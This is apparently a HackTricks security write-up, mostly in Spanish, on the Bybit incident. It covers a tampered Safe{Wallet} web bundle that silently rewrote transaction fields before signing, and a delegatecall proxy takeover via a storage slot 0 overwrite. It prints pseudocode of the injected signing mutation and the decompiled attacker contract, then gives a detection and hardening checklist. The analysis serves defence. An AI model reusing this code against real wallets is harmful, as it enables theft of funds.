# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Resumen

Una cadena de robo de cold-wallet combinó un **supply-chain compromise of the Safe{Wallet} web UI** con una **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**. Los puntos clave son:

- Si una dApp puede inyectar código en la ruta de firma, puede hacer que un signer produzca una **EIP-712 signature over attacker-chosen fields** mientras restaura los datos originales de la UI para que otros signers no se den cuenta.
- Los proxies de Safe almacenan `masterCopy` (implementation) en **storage slot 0**. Un delegatecall a un contrato que escribe en el slot 0 efectivamente “actualiza” el Safe a la lógica del atacante, dando control total de la wallet.

## Off-chain: Mutación dirigida de firma en Safe{Wallet}

Un bundle de Safe manipulado (`_app-*.js`) atacó selectivamente direcciones específicas de Safe + signer. La lógica inyectada se ejecutó justo antes de la llamada de firma:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Propiedades del ataque
- **Context-gated**: Las allowlists codificadas para Safes/firmantes de la víctima redujeron el ruido y dificultaron la detección.
- **Last-moment mutation**: los campos (`to`, `data`, `operation`, gas) se sobrescribieron inmediatamente antes de `signTransaction` y luego se revirtieron, de modo que las cargas de la propuesta en la UI parecían benignas mientras las firmas coincidían con la carga del atacante.
- **EIP-712 opacity**: las wallets mostraban datos estructurados pero no decodificaban calldata anidada ni resaltaban `operation = delegatecall`, haciendo que el mensaje mutado fuera firmado a ciegas.

### Relevancia de la validación del gateway
Las propuestas de Safe se envían al **Safe Client Gateway**. Antes de las comprobaciones reforzadas, el gateway podía aceptar una propuesta donde `safeTxHash`/firma correspondían a campos distintos del cuerpo JSON si la UI los reescribía después de la firma. Tras el incidente, el gateway ahora rechaza las propuestas cuyo hash/firma no coincidan con la transacción enviada. Una verificación de hash equivalente del lado servidor debería aplicarse a cualquier API de orquestación de firmas.

## En cadena: Delegatecall proxy takeover via slot collision

Los proxies de Safe mantienen `masterCopy` en **storage slot 0** y delegan toda la lógica en él. Como Safe soporta **`operation = 1` (delegatecall)**, cualquier transacción firmada puede apuntar a un contrato arbitrario y ejecutar su código en el contexto de almacenamiento del proxy.

Un contrato atacante imitó un ERC-20 `transfer(address,uint256)`, pero en su lugar escribió `_to` en el slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy validates signatures over these parameters.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body writes slot 0.
4. Slot 0 (`masterCopy`) now points to attacker-controlled logic → **full wallet takeover and fund drain**.

## Lista de comprobación para detección y endurecimiento

- **Integridad de la UI**: asegurar/pinear recursos JS / SRI; monitorizar diffs del bundle; tratar la UI de firma como parte de la frontera de confianza.
- **Validación en tiempo de firma**: hardware wallets con **EIP-712 clear-signing**; renderizar explícitamente `operation` y decodificar calldata anidada. Rechazar la firma cuando `operation = 1` a menos que la política lo permita.
- **Comprobaciones de hash en servidor**: gateways/servicios que retransmiten propuestas deben recomputar `safeTxHash` y validar que las firmas coinciden con los campos enviados.
- **Políticas/listas permitidas**: reglas preflight para `to`, selectores, tipos de asset, y prohibir delegatecall salvo para flujos vetados. Requerir un servicio de políticas interno antes de retransmitir transacciones totalmente firmadas.
- **Diseño de contratos**: evitar exponer delegatecall arbitrario en multisig/treasury wallets salvo que sea estrictamente necesario. Colocar punteros de upgrade fuera del slot 0 o protegerlos con lógica de upgrade explícita y control de acceso.
- **Monitorización**: alertar sobre ejecuciones de delegatecall desde wallets que contengan fondos de tesorería, y sobre propuestas que cambien `operation` respecto a los patrones típicos de `call`.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
